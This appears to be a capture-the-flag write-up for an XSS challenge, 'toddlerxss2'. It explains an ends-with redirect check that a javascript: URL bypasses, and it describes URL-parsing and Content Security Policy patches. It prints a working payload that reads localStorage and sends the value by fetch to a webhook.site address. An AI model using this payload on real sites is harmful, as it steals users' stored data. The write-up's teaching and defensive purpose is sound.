# toddlerxss2 - Writeup

## 1. Where the vulnerability exists and why it happens
The bug is in the inline script at the bottom of `public/pages/index.html`. The page reads a `redirect` value from the URL and hands it to a `safeRedirect()` function:
```js 
const redirect = url.searchParams.get('redirect');
if (redirect) { safeRedirect(redirect); }

function safeRedirect(url) {
    if ((url.endsWith('apple.com') || ... || url.endsWith('microsoft.com')) && !url.includes('flag')) {
        window.location.href = url; // dangerous line
    } else {...}
}
```
Two mistakes make this exploitable:
1. The check only looks at how the text **ends** and never checks the URL's **scheme**. So a `javascript:` link that ends in `apple.com` passes.
2. Sending the browser to a `javascript:` link actually runs that code on the site itself, and the site is where the flag is kept (in `localStorage`).

The only catch is the `!url.includes('flag')` rule, so the payload just can't contain the word "flag". One can get around that by reading the value without naming it. `localStorage.getItem(localStorage.key(0))` grabs the first stored value, which is the flag. 

## How I exploited it and got the flag
1. I set up the same free request-logging page I used from **babyxss** (webhook.site)
2. I used this link. The `javascript:` part runs the code that reads the flag and sends it to my webhook. The `\\apple.com` at the end is a code comment, so the whole string still "ends with apple.com" and passes the weak check:

       http://toddlerxss2.136-83-2-1.sslip.io/?redirect=javascript:fetch(`https://webhook.site/<id>/?f=${localStorage.getItem(localStorage.key(0))}`)//apple.com
3. I pasted this link into "Resume URL" box and submitted (like from **babyxss**), which makes the admin bot visit it. 
4. The flag arrived at my webhook in the `?f=` part of the request.

## How the code patch works (`vuln.patch`)
I rewrote `safeRedirect()` so it actually parses the URL and checks two things: the **scheme** must be http/https (which throws out `javascript:` links), and the **exact hostname** must be on an allow-list (not just "ends with"). The legitimate Career Hub links still go through because their hosts (like `www.apple.com`) are on the list, but the `javascript:` payload is rejected. 

## How the CSP 2.0 patch works (`csp2.patch`)
This page has a real inline `<script>` of its own, so for CSP 2.0, I moved that script into an external file (`/static/js/app.js`) and pointed the page at it with the `<script src="...">`. Then I added a header:
    
    script-src 'self' (no 'unsafe-inline', no 'unsafe-eval')

With `'unsafe-inline'` gone, the browser refuses to run anything inline, including a `javascript:` link so the attack is blocked. The real script still runs because it now comes from the site as a proper file. The page still works as expected. 

This patch touches 3 files: the header in `app.js`, a new `/static/js/app.js`, and `index.html`. 

## How the CSP 3.0 patch works (`csp3.patch`)
Here I kept the script inline but protected it with a nonce. The server puts the nonce both in the header and on the page's own `<script nonce="...">` tag, so that one script is trusted. The attacker's `javascript:` link has no nonce, so the broswer blocks it. Because the page is served from a static file, I changed `app.js` to generate the nonce, stamp it onto the script tag as the page is sent, and set the matching header. I also added `strict-dynamic` (similar thing I did in **babyxss**).